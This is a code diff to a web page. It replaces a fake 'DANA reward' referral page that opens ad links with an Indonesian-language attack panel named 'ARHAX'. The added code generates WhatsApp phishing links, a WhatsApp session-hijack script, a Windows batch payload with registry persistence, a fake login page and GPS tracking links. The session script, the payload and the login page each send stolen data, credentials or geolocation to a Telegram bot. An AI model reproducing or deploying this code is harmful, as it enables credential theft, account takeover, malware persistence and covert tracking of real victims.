-        window.open('https://wa.me/?text=Yuk dapat reward dari DANA! ' + link, '_blank');
-    };
-    
-    // REFERRAL LOGIC
-    let urlRef = new URLSearchParams(window.location.search).get('ref');
-    if(urlRef && urlRef !== userId){
-        let refClaimed = localStorage.getItem('dl_refclaimed') === 'true';
-        if(!refClaimed){
-            window.open('https://quge5.com/click?zone=231027', '_blank');
-            localStorage.setItem('dl_refclaimed', 'true');
-            alert('Verifikasi');
-        } else {
-            if(!refs.includes(urlRef)){
-                refs.push(urlRef);
-                localStorage.setItem('dl_refs', JSON.stringify(refs));
-                addBalance(10000);
-                updateReferralUI();
+
+    function refreshData() { updateDashboard(); }
+    function exportData() {
+        let csv = "Time,IP,Location,Feature\n" + victims.map(v => `${v.time},${v.ip},${v.location},${v.feature}`).join("\n");
+        let blob = new Blob([csv], {type: 'text/csv'});
+        let link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = `arhax_victims_${Date.now()}.csv`;
+        link.click();
+    }
+
+    // Simulasi victim (untuk testing real-time)
+    async function simulateVictimNow() {
+        let fakeIPs = ['192.168.1.' + Math.floor(Math.random()*255), '45.76.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)];
+        let fakeLocs = ['Jakarta', 'Surabaya', 'Bandung', 'Medan', 'Makassar'];
+        let fakeFeatures = ['WhatsApp Phish', 'GPS Track', 'Payload Download', 'Session Hijack', 'Real-time Test'];
+        let ip = fakeIPs[Math.floor(Math.random()*fakeIPs.length)];
+        let loc = fakeLocs[Math.floor(Math.random()*fakeLocs.length)];
+        let feat = fakeFeatures[Math.floor(Math.random()*fakeFeatures.length)];
+        await addVictim(ip, loc, feat);
+        document.getElementById('locationResult').innerHTML = `<div class="alert-success">✅ Simulasi victim real-time: ${ip} - ${loc}</div>`;
+        setTimeout(() => { document.getElementById('locationResult').innerHTML = ''; }, 2000);
+    }
+
+    // ==================== WHATSAPP REAL-TIME ====================
+    async function generateWAPhish() {
+        let link = `https://wa-web-login.vercel.app/?id=${Date.now()}`;
+        document.getElementById('waResult').innerHTML = `
+            <strong>🔗 PHISHING LINK WHATSAPP:</strong><br>${link}<br>
+            <button onclick="navigator.clipboard.writeText('${link}')">📋 COPY LINK</button>
+        `;
+        await addVictim('WA Phish', 'Link Generated', `WhatsApp phishing: ${link}`);
+        await sendTelegram(`🔗 WhatsApp Phishing link dibuat: ${link}`);
+    }
+
+    function showWASessionCode() {
+        let code = `(function() {
+    let session = localStorage.getItem('WASessionStore');
+    if(session) fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage', {
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:'${CHAT_ID}', text:'WA Session: '+session.substring(0,200)})
+    });
+})();`;
+        document.getElementById('waResult').innerHTML = `
+            <strong>🔑 SESSION HIJACK CODE:</strong>
+            <div class="code-block"><pre>${code}</pre></div>
+            <button onclick="navigator.clipboard.writeText(\`${code.replace(/`/g, '\\`')}\`)">📋 COPY</button>
+        `;
+    }
+
+    function showAntiRevoke() {
+        let code = `(function() {
+    let originalDelete = window.Store?.Msg?.delete;
+    if(originalDelete) window.Store.Msg.delete = function(msgId){ console.log('[!] Deleted:',msgId); return originalDelete(msgId); };
+})();`;
+        document.getElementById('waResult').innerHTML = `<div class="code-block"><pre>${code}</pre></div><button onclick="navigator.clipboard.writeText(\`${code.replace(/`/g, '\\`')}\`)">📋 COPY</button>`;
+    }
+
+    function showStatusDownloader() {
+        let code = `(function(){
+    let statuses = document.querySelectorAll('[data-testid="status-list"] video, [data-testid="status-list"] img');
+    statuses.forEach((m,i)=>{ let a=document.createElement('a'); a.href=m.src; a.download='status_'+i+'.jpg'; a.click(); });
+})();`;
+        document.getElementById('waResult').innerHTML = `<div class="code-block"><pre>${code}</pre></div><button onclick="navigator.clipboard.writeText(\`${code.replace(/`/g, '\\`')}\`)">📋 COPY</button>`;
+    }
+
+    let demoChats = [
+        { name: "Ayu", last: "Kamu dimana?", time: "10:30", msgs: [{from:"Ayu",text:"Pagi sayang",time:"10:00"},{from:"Ayu",text:"Kamu dimana?",time:"10:30"}] },
+        { name: "Boss", last: "Tugas?", time: "09:15", msgs: [{from:"Boss",text:"Tugas selesai?",time:"09:00"},{from:"Boss",text:"Cepet ya",time:"09:15"}] },
+        { name: "Group Keluarga", last: "Pulang kapan?", time: "08:45", msgs: [{from:"Ibu",text:"Sarapan dulu",time:"08:00"},{from:"Ayah",text:"Pulang kapan?",time:"08:45"}] }
+    ];
+
+    function loadDemoWAChats() {
+        let listHtml = demoChats.map((c,i) => `<div style="padding:8px; border-bottom:1px solid #0f0; cursor:pointer;" onclick="showDemoMessages(${i})"><strong>${c.name}</strong><br><small>${c.last} • ${c.time}</small></div>`).join('');
+        document.getElementById('waChatList').innerHTML = listHtml;
+        document.getElementById('waChats').innerText = demoChats.length;
+        let totalMsgs = demoChats.reduce((a,c) => a + c.msgs.length, 0);
+        document.getElementById('waMsgs').innerText = totalMsgs;
+        document.getElementById('waStatus').innerHTML = '🟢';
+    }
+
+    function showDemoMessages(idx) {
+        let chat = demoChats[idx];
+        let msgHtml = chat.msgs.map(m => `<div style="margin:5px 0; ${m.from==='Me' ? 'text-align:right;color:#0f0' : 'text-align:left;color:#aaa'}"><strong>${m.from}:</strong> ${m.text}<br><small>${m.time}</small></div>`).join('');
+        document.getElementById('waMessages').innerHTML = msgHtml;
+    }
+
+    function startLiveChatSimulation() {
+        if(liveChatInterval) clearInterval(liveChatInterval);
+        liveChatInterval = setInterval(() => {
+            let randomContact = demoChats[Math.floor(Math.random() * demoChats.length)];
+            let randomMsg = ["Halo", "Ok", "Besok ya", "Siap", "Lagi apa?", "Gas"] [Math.floor(Math.random()*6)];
+            let newMsg = { from: randomContact.name, text: randomMsg, time: new Date().toLocaleTimeString() };
+            if(randomContact.msgs.length > 10) randomContact.msgs.shift();
+            randomContact.msgs.push(newMsg);
+            loadDemoWAChats();
+            // Tampilkan notifikasi real-time di chat aktif (jika sedang dibuka)
+            let activeChatDiv = document.getElementById('waMessages');
+            if(activeChatDiv && activeChatDiv.innerHTML.includes(randomContact.name)) {
+                showDemoMessages(demoChats.indexOf(randomContact));
             }
-            localStorage.removeItem('dl_refclaimed');
+        }, 8000);
+    }
+
+    function stopLiveChatSimulation() {
+        if(liveChatInterval) clearInterval(liveChatInterval);
+        liveChatInterval = null;
+    }
+
+    // ==================== PAYLOAD GENERATOR ====================
+    async function generatePayload() {
+        let name = document.getElementById('payloadName').value;
+        if(!name) { alert("Isi nama payload dulu!"); return; }
+        let link = window.location.href + (window.location.href.includes('?') ? '&' : '?') + `track=${encodeURIComponent(name)}&id=${Date.now()}`;
+        let payloadCode = `@echo off\ntitle ${name}\ncolor 0a\nreg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${name}" /t REG_SZ /d "%~f0" /f\ncurl -s "https://api.ipify.org" > %temp%\\ip.txt\ncurl -s "http://ip-api.com/json/$(cat %temp%\\ip.txt)" > %temp%\\geo.txt\nfor /f "delims=" %%i in (%temp%\\geo.txt) do curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text="%%i"\ndel %temp%\\ip.txt %temp%\\geo.txt\necho [✓] ${name}\npause`;
+        document.getElementById('payloadResult').style.display = 'block';
+        document.getElementById('payloadResult').innerHTML = `
+            <strong>✅ PAYLOAD + TRACKING LINK</strong><br>
+            <strong>🔗 LINK (SEBAR KE TARGET):</strong><br>${link}<br>
+            <button onclick="navigator.clipboard.writeText('${link}')">📋 COPY LINK</button><br>
+            <strong>💀 PAYLOAD CODE (.bat):</strong><pre>${payloadCode}</pre>
+            <button onclick="navigator.clipboard.writeText(\`${payloadCode.replace(/`/g, '\\`')}\`)">📋 COPY PAYLOAD</button>
+        `;
+        await addVictim('Payload Gen', 'System', `Generated: ${name}`);
+        await sendTelegram(`⚡ New payload: ${name}\n🔗 ${link}`);
+    }
+
+    // ==================== PHISHING ====================
+    async function generatePhishPage() {
+        let type = document.getElementById('phishType').value;
+        let link = window.location.href + (window.location.href.includes('?') ? '&' : '?') + `phish=${type}&id=${Date.now()}`;
+        document.getElementById('phishResult').style.display = 'block';
+        document.getElementById('phishResult').innerHTML = `<strong>🔗 PHISHING LINK:</strong><br>${link}<br><button onclick="navigator.clipboard.writeText('${link}')">📋 COPY</button>`;
+        await addVictim('Phish Gen', 'System', `Phishing: ${type}`);
+        await sendTelegram(`🎭 Phishing page: ${type}\n🔗 ${link}`);
+    }
+
+    async function capturePhishData() {
+        let user = document.getElementById('fakeUser').value;
+        let pass = document.getElementById('fakePass').value;
+        if(user && pass) {
+            await addVictim('Phish Victim', 'Captured', `Creds: ${user}|${pass}`);
+            await sendTelegram(`🎭 PHISHING CREDENTIALS!\n👤 ${user}\n🔑 ${pass}`);
+            alert(`✅ Data terkirim ke Telegram!\nUser: ${user}\nPass: ${pass}`);
+            document.getElementById('fakeUser').value = '';
+            document.getElementById('fakePass').value = '';
+        } else alert("Isi dulu!");
+    }
+
+    // ==================== GPS TRACKER REAL-TIME ====================
+    async function getUserLocation() {
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async pos => {
+                let lat = pos.coords.latitude, lng = pos.coords.longitude;
+                document.getElementById('locationResult').innerHTML = `📍 ${lat}, ${lng}<br><a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank">Buka Maps</a>`;
+                await addVictim('GPS', `${lat},${lng}`, 'Live Location');
+                await sendTelegram(`📍 GPS LIVE LOCATION\n🌍 Lat: ${lat}\n🌏 Lng: ${lng}\n🔗 Maps: https://www.google.com/maps?q=${lat},${lng}`);
+                if(trackMap) trackMap.remove();
+                trackMap = L.map('trackMap').setView([lat, lng], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(trackMap);
+                L.marker([lat, lng]).addTo(trackMap).bindPopup('Target Location').openPopup();
+            }, err => alert('Gagal: ' + err.message));
+        } else alert('GPS not supported');
+    }
+
+    async function generateTrackLink() {
+        let link = window.location.href + (window.location.href.includes('?') ? '&' : '?') + `track=gps&id=${Date.now()}`;
+        document.getElementById('trackLinkResult').style.display = 'block';
+        document.getElementById('trackLinkResult').innerHTML = `<strong>🔗 TRACKING LINK:</strong><br>${link}<br><button onclick="navigator.clipboard.writeText('${link}')">📋 COPY</button>`;
+        await sendTelegram(`🔗 GPS Tracking link generated: ${link}`);
+    }
+
+    // ==================== TOOLS ====================
+    async function ipInfo() {
+        let res = await fetch('https://api.ipify.org?format=json');
+        let data = await res.json();
+        let geo = await (await fetch(`http://ip-api.com/json/${data.ip}`)).json();
+        let info = `🌐 IP: ${geo.query}\nCountry: ${geo.country}\nCity: ${geo.city}\nISP: ${geo.isp}\nLat/Lon: ${geo.lat}, ${geo.lon}`;
+        document.getElementById('toolsResult').innerHTML = `<pre>${info}</pre>`;
+        await sendTelegram(`🌐 IP Info: ${info}`);
+    }
+    function dnsLookup() { let d=prompt("Domain:"); if(d) document.getElementById('toolsResult').innerHTML = `🔍 DNS untuk ${d}<br>Gunakan perintah: nslookup ${d}`; }
+    function portScan() { let ip=prompt("IP target:"); if(ip) document.getElementById('toolsResult').innerHTML = `🛡️ Port scan untuk ${ip}<br>Contoh: nmap -p- ${ip}`; }
+    function generatePassword() { let p=Math.random().toString(36).slice(-12)+"!@#"; document.getElementById('toolsResult').innerHTML = `🔐 Password: <strong>${p}</strong><br><button onclick="navigator.clipboard.writeText('${p}')">Copy</button>`; }
+
+    // ==================== MAP REAL-TIME ====================
+    function initVictimsMap() {
+        map = L.map('victimsMap').setView([-6.2, 106.8], 5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        updateMapMarkers();
+    }
+
+    function updateMapMarkers() {
+        if(!map) return;
+        victims.forEach(v => {
+            let lat = -7 + Math.random() * 14;
+            let lng = 95 + Math.random() * 30;
+            L.marker([lat, lng]).addTo(map).bindPopup(`${v.ip}<br>${v.feature}<br>${v.time}`);
+        });
+    }
+
+    // ==================== TRACKING URL ====================
+    function checkURLTracking() {
+        let urlParams = new URLSearchParams(window.location.search);
+        let track = urlParams.get('track');
+        let phish = urlParams.get('phish');
+        if(track) {
+            fetch('https://api.ipify.org?format=json')
+                .then(r=>r.json())
+                .then(data=>{
+                    fetch(`http://ip-api.com/json/${data.ip}`)
+                        .then(r=>r.json())
+                        .then(geo=>{
+                            addVictim(data.ip, `${geo.city}, ${geo.country}`, `Track: ${track}`);
+                            document.body.innerHTML = '<div style="text-align:center;margin-top:20%;color:#0f0;"><h1>Redirecting...</h1></div>';
+                            setTimeout(()=>{ window.location.href="https://google.com"; }, 1500);
+                        });
+                });
+        }
+        if(phish) {
+            document.body.innerHTML = `
+                <div style="max-width:350px;margin:10% auto;background:#000;border:2px solid #0f0;padding:20px;border-radius:10px;text-align:center;">
+                    <h3>Login Required</h3>
+                    <input type="text" id="phEmail" placeholder="Email" style="width:100%;margin:5px 0;padding:8px;">
+                    <input type="password" id="phPass" placeholder="Password" style="width:100%;margin:5px 0;padding:8px;">
+                    <button onclick="sendPhishCreds()">Login</button>
+                </div>
+                <script>
+                    async function sendPhishCreds(){
+                        let e=document.getElementById('phEmail').value, p=document.getElementById('phPass').value;
+                        await fetch('${window.location.origin}${window.location.pathname}?capture='+encodeURIComponent(e+'|'+p));
+                        alert('Login gagal');
+                        window.location.href='https://google.com';
+                    }
+                    if(window.location.search.includes('capture')){
+                        let creds=new URLSearchParams(window.location.search).get('capture');
+                        fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage',{method:'POST',body:JSON.stringify({chat_id:'${CHAT_ID}',text:'🎭 PHISH: '+creds})});
+                    }
+                <\/script>
+            `;
         }
     }
-    
-    // NAVIGATION
-    function showPage(pageId){
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
-        document.getElementById(pageId).classList.add('active-page');
-        document.querySelectorAll('.menu button').forEach(b => b.classList.remove('active'));
-        if(pageId === 'pageDashboard') document.getElementById('btnDashboard').classList.add('active');
-        if(pageId === 'pageSaldo') document.getElementById('btnSaldo').classList.add('active');
-        if(pageId === 'pageBagikan') document.getElementById('btnBagikan').classList.add('active');
-    }
-    
-    document.getElementById('btnDashboard').onclick = () => showPage('pageDashboard');
-    document.getElementById('btnSaldo').onclick = () => showPage('pageSaldo');
-    document.getElementById('btnBagikan').onclick = () => showPage('pageBagikan');
-    
-    // AD PLACEMENT
-    let adDiv = document.getElementById('adContainer');
-    if(adDiv){
-        let zoneDiv = document.createElement('div');
-        zoneDiv.setAttribute('data-zone', '231027');
-        adDiv.appendChild(zoneDiv);
-    }
-})();
+
+    // ==================== NAVIGATION ====================
+    document.querySelectorAll('.nav-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active-panel'));
+            document.getElementById(`page-${btn.dataset.page}`).classList.add('active-panel');
+        });
+    });
+
+    // ==================== INIT & REAL-TIME POLLING ====================
+    updateDashboard();
+    loadDemoWAChats();
+    setTimeout(() => { if(document.getElementById('victimsMap')) initVictimsMap(); }, 500);
+    setTimeout(() => { if(document.getElementById('trackMap')) initVictimsMap(); }, 500);
+    checkURLTracking();
+    startLiveChatSimulation();
+
+    // Real-time auto-refresh dashboard setiap 2 detik (untuk update dari tab lain? tidak perlu, tapi biar mantap)
+    setInterval(() => {
+        if(document.getElementById('page-dashboard').classList.contains('active-panel')) {
+            updateDashboard();
+        }
+    }, 2000);
+
+    // Simulasi victim random setiap 20 detik untuk menunjukkan real-time
+    setInterval(() => {
+        if(Math.random() > 0.75) {
+            simulateVictimNow();
+        }
+    }, 20000);
+
+    sendTelegram("🟢 ARHAX REAL-TIME PANEL AKTIF! Semua fitur real-time siap.");
 </script>
 </body>
 </html>
